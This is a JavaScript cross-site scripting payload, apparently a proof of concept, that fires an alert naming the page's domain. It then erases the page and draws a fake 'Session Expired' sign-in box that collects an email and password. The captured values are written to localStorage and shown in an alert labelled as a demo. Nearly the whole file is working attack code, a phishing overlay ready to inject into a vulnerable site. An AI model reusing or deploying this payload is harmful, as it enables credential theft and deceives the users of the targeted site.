alert('xss by ambush on'+document.domain);
(function () {
  // Remove existing content
  document.documentElement.innerHTML = "";

  // Basic styling
  const style = document.createElement("style");
  style.innerHTML = `
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #f4f6f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      width: 360px;
      text-align: center;
    }
    .login-box h2 {
      margin-bottom: 10px;
    }
    .login-box p {
      font-size: 14px;
      color: #555;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button {
      width: 100%;
      padding: 10px;
      background: #2563eb;
      color: white;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    button:hover {
      background: #1e40af;
    }
  `;
  document.head.appendChild(style);

  // Create phishing UI
  const container = document.createElement("div");
  container.className = "login-box";
  container.innerHTML = `
    <h2>Session Expired</h2>
    <p>Please re-enter your credentials to continue</p>
    <input id="email" type="email" placeholder="Email address">
    <input id="password" type="password" placeholder="Password">
    <button id="loginBtn">Sign In</button>
  `;

  document.body.appendChild(container);

  // Capture demo credentials safely
  document.getElementById("loginBtn").onclick = function () {
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Store locally just for demo proof
    localStorage.setItem("phish_email_demo", email);
    localStorage.setItem("phish_password_demo", password);

    alert("Demo: Credentials captured locally.\n\nEmail: " + email + "\nPassword: " + password);
  };
})();
